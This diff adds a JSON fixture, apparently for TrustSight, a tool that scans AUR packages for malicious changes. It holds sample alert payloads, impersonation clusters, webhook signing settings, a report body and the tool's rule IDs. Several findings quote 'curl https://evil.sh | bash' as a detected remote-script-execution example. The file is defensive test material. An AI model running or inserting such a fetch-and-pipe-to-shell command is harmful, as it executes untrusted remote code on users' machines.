@@ -1,0 +1,572 @@
+{
+  "alert_payload": {
+    "alerts": [
+      {
+        "package": "some-pkg",
+        "rule_id": "H088"
+      }
+    ],
+    "campaign_cluster": [
+      {
+        "count": 3,
+        "members": [
+          "a",
+          "b",
+          "c"
+        ],
+        "rule_id": "G001"
+      },
+      {
+        "count": 2,
+        "members": [
+          "yyay",
+          "parru"
+        ],
+        "rule_id": "G005"
+      }
+    ],
+    "cycle": {
+      "added": 3,
+      "changed": 41,
+      "processed": 44,
+      "removed": 2
+    },
+    "event": "trustsight.alerts",
+    "impersonation": [
+      {
+        "count": 2,
+        "maintainer": "marchos1as",
+        "members": [
+          "yyay",
+          "parru"
+        ],
+        "targets": [
+          "yay",
+          "paru"
+        ]
+      }
+    ],
+    "ioc_matches": [
+      {
+        "aur": "https://aur.archlinux.org/packages/bad-pkg",
+        "indicator": "hash:deadbeef",
+        "package": "bad-pkg"
+      }
+    ],
+    "over_threshold": [
+      {
+        "aur": "https://aur.archlinux.org/packages/hot-pkg",
+        "findings": [
+          {
+            "file": "PKGBUILD",
+            "line": 12,
+            "reason": "Remote Script Execution: curl https://evil.sh | bash",
+            "rule_id": "R001",
+            "severity": "CRITICAL",
+            "weight": 30
+          },
+          {
+            "file": "",
+            "line": null,
+            "reason": "checksums declared for all non-VCS sources",
+            "rule_id": "P001",
+            "severity": "INFO",
+            "weight": 0
+          }
+        ],
+        "last_modified": "2026-05-01 00:00 UTC",
+        "package": "hot-pkg",
+        "rules": [
+          "R001",
+          "P001"
+        ],
+        "score": 45,
+        "version": "1.0 -> 1.1"
+      }
+    ],
+    "over_threshold_grouped": 0,
+    "priority": "default",
+    "refusals": [
+      {
+        "aur": "https://aur.archlinux.org/packages/unread-pkg",
+        "package": "unread-pkg"
+      }
+    ],
+    "title": "TrustSight: impersonation campaign by marchos1as (2 name-clones)",
+    "tool": "trustsight"
+  },
+  "coverage_gaps": [
+    "binary_metadata",
+    "companion_truncated",
+    "deps_not_scanned",
+    "diff_truncated",
+    "history_truncated",
+    "line_truncated",
+    "noextract_suppressed",
+    "parent_baseline",
+    "partial_file_analysis",
+    "partial_hunk",
+    "ruleset_drifted",
+    "scan_truncated",
+    "snapshot_refused",
+    "stage_degraded",
+    "tree_not_analyzed",
+    "unpinned_build_deps",
+    "unresolved_parse_time",
+    "unresolved_source"
+  ],
+  "ingest": {
+    "body": {
+      "alerts": [
+        {
+          "package": "some-pkg",
+          "rule_id": "H088"
+        }
+      ],
+      "campaign_cluster": [
+        {
+          "count": 3,
+          "members": [
+            "a",
+            "b",
+            "c"
+          ],
+          "rule_id": "G001"
+        },
+        {
+          "count": 2,
+          "members": [
+            "yyay",
+            "parru"
+          ],
+          "rule_id": "G005"
+        }
+      ],
+      "cycle": {
+        "added": 3,
+        "changed": 41,
+        "processed": 44,
+        "removed": 2
+      },
+      "event": "trustsight.alerts",
+      "impersonation": [
+        {
+          "count": 2,
+          "maintainer": "marchos1as",
+          "members": [
+            "yyay",
+            "parru"
+          ],
+          "targets": [
+            "yay",
+            "paru"
+          ]
+        }
+      ],
+      "ioc_matches": [
+        {
+          "aur": "https://aur.archlinux.org/packages/bad-pkg",
+          "indicator": "hash:deadbeef",
+          "package": "bad-pkg"
+        }
+      ],
+      "over_threshold": [
+        {
+          "aur": "https://aur.archlinux.org/packages/hot-pkg",
+          "findings": [
+            {
+              "file": "PKGBUILD",
+              "line": 12,
+              "reason": "Remote Script Execution: curl https://evil.sh | bash",
+              "rule_id": "R001",
+              "severity": "CRITICAL",
+              "weight": 30
+            },
+            {
+              "file": "",
+              "line": null,
+              "reason": "checksums declared for all non-VCS sources",
+              "rule_id": "P001",
+              "severity": "INFO",
+              "weight": 0
+            }
+          ],
+          "last_modified": "2026-05-01 00:00 UTC",
+          "package": "hot-pkg",
+          "rules": [
+            "R001",
+            "P001"
+          ],
+          "score": 45,
+          "version": "1.0 -> 1.1"
+        }
+      ],
+      "over_threshold_grouped": 0,
+      "priority": "default",
+      "refusals": [
+        {
+          "aur": "https://aur.archlinux.org/packages/unread-pkg",
+          "package": "unread-pkg"
+        }
+      ],
+      "title": "TrustSight: impersonation campaign by marchos1as (2 name-clones)",
+      "tool": "trustsight"
+    },
+    "headers": [
+      "webhook-id",
+      "webhook-timestamp",
+      "webhook-key-id",
+      "webhook-signature"
+    ],
+    "method": "POST",
+    "signature_algorithm": "ed25519",
+    "signature_format": "v1=<base64>",
+    "signed_material": "webhook-id.webhook-timestamp.raw_body"
+  },
+  "pseudo_rule_ids": [
+    "COVERAGE",
+    "NOVELTY",
+    "P001",
+    "P002",
+    "P003",
+    "P005",
+    "P006",
+    "P007",
+    "P008",
+    "SOURCE_BUCKET"
+  ],
+  "report_body": {
+    "acknowledged_urls": [],
+    "boundaries": [],
+    "cached": false,
+    "cached_at": "",
+    "change": {},
+    "changes": [],
+    "cofire_health": [],
+    "comparison_base": "",
+    "config_fingerprint": "",
+    "coverage_gaps": [],
+    "coverage_gaps_carried": [],
+    "dependencies": [],
+    "depth_truncated": false,
+    "diff_truncated": false,
+    "failed": false,
+    "file_changes": [],
+    "findings": [
+      {
+        "description": "curl https://evil.sh | bash",
+        "evidence": {},
+        "file": "PKGBUILD",
+        "line": 12,
+        "rule_id": "R001",
+        "severity": "CRITICAL",
+        "template": ""
+      },
+      {
+        "description": "checksum set to SKIP",
+        "evidence": {},
+        "file": "",
+        "line": null,
+        "rule_id": "H001",
+        "severity": "HIGH",
+        "template": ""
+      }
+    ],
+    "first_seen": false,
+    "flagged": true,
+    "fully_vetted": true,
+    "indicators": [],
+    "ioc_matches": [],
+    "is_trivial": false,
+    "layers": {},
+    "new_commit": "",
+    "new_version": "1.1",
+    "old_commit": "",
+    "old_version": "1.0",
+    "overrides_expired": [],
+    "package": "demo",
+    "partial_files": [],
+    "required_by": [],
+    "resolution_coverage": {},
+    "review_profile": "default",
+    "review_threshold": 20,
+    "risk": "Medium",
+    "risk_label": "Medium",
+    "scan_truncated": false,
+    "score": 45,
+    "score_breakdown": [],
+    "suppressed_rules": [],
+    "unresolved_assignments": [],
+    "verdict": "Version bump. modified PKGBUILD. Review the diff before building.",
+    "version_comparison": ""
+  },
+  "rule_ids": [
+    "A001",
+    "A002",
+    "A003",
+    "A004",
+    "A005",
+    "A006",
+    "A007",
+    "A008",
+    "C001",
+    "C002",
+    "C003",
+    "C004",
+    "C005",
+    "C006",
+    "C007",
+    "C008",
+    "C009",
+    "C010",
+    "C011",
+    "C012",
+    "C013",
+    "C014",
+    "C015",
+    "C016",
+    "C017",
+    "C018",
+    "C019",
+    "C020",
+    "C021",
+    "C022",
+    "C023",
+    "C024",
+    "C025",
+    "C026",
+    "C027",
+    "C028",
+    "C029",
+    "C030",
+    "C031",
+    "D001",
+    "D002",
+    "D003",
+    "D004",
+    "E001",
+    "E002",
+    "E003",
+    "G001",
+    "G002",
+    "G003",
+    "G004",
+    "G005",
+    "G006",
+    "G007",
+    "H001",
+    "H002",
+    "H003",
+    "H004",
+    "H005",
+    "H006",
+    "H007",
+    "H008",
+    "H009",
+    "H010",
+    "H011",
+    "H012",
+    "H013",
+    "H014",
+    "H015",
+    "H016",
+    "H017",
+    "H018",
+    "H019",
+    "H020",
+    "H021",
+    "H022",
+    "H023",
+    "H024",
+    "H025",
+    "H026",
+    "H027",
+    "H028",
+    "H029",
+    "H030",
+    "H031",
+    "H032",
+    "H033",
+    "H034",
+    "H035",
+    "H036",
+    "H037",
+    "H038",
+    "H039",
+    "H040",
+    "H041",
+    "H042",
+    "H043",
+    "H044",
+    "H045",
+    "H046",
+    "H047",
+    "H048",
+    "H049",
+    "H050",
+    "H051",
+    "H052",
+    "H053",
+    "H054",
+    "H055",
+    "H056",
+    "H057",
+    "H058",
+    "H059",
+    "H060",
+    "H061",
+    "H062",
+    "H063",
+    "H064",
+    "H065",
+    "H066",
+    "H067",
+    "H068",
+    "H069",
+    "H070",
+    "H071",
+    "H072",
+    "H073",
+    "H074",
+    "H075",
+    "H076",
+    "H077",
+    "H078",
+    "H079",
+    "H080",
+    "H081",
+    "H082",
+    "H083",
+    "H084",
+    "H085",
+    "H086",
+    "H087",
+    "H088",
+    "H089",
+    "H090",
+    "H091",
+    "H092",
+    "H093",
+    "H094",
+    "H095",
+    "H096",
+    "H097",
+    "H098",
+    "H099",
+    "H100",
+    "H101",
+    "H102",
+    "H103",
+    "M001",
+    "M002",
+    "M003",
+    "M004",
+    "M005",
+    "R001",
+    "R002",
+    "R003",
+    "R007",
+    "R008",
+    "R010",
+    "R011",
+    "R012",
+    "R013",
+    "R017",
+    "R039",
+    "R040",
+    "R041",
+    "R042",
+    "R043",
+    "R044",
+    "R045",
+    "R046",
+    "R047",
+    "R048",
+    "R049",
+    "R050",
+    "R051",
+    "R052",
+    "R053",
+    "R054",
+    "R055",
+    "R056",
+    "R057",
+    "R058",
+    "R059",
+    "R078",
+    "R091",
+    "R099",
+    "R104",
+    "R144",
+    "R152",
+    "S001",
+    "S002",
+    "S003",
+    "S004",
+    "S005",
+    "S006",
+    "S007",
+    "S008",
+    "T001",
+    "T002",
+    "T003",
+    "U001",
+    "U002",
+    "U003",
+    "U004",
+    "U005",
+    "U006",
+    "W001",
+    "W002",
+    "W003",
+    "W004",
+    "W005",
+    "W006",
+    "W007",
+    "W008",
+    "W009",
+    "W010",
+    "X001",
+    "X002",
+    "X003",
+    "X004",
+    "X005",
+    "X006",
+    "X007",
+    "X008",
+    "X009",
+    "X010",
+    "X011",
+    "X012",
+    "X013",
+    "X014",
+    "X015",
+    "X016",
+    "X017",
+    "X018",
+    "X019",
+    "X020",
+    "X021",
+    "X022",
+    "X023",
+    "X024",
+    "X025",
+    "X026",
+    "X027",
+    "X028",
+    "X029",
+    "X030",
+    "X031",
+    "X032",
+    "X033"
+  ],
+  "severities": [
+    "CRITICAL",
+    "FATAL",
+    "HIGH",
+    "INFO",
+    "LOW",
+    "MEDIUM"
+  ],
+  "version": 1
+}
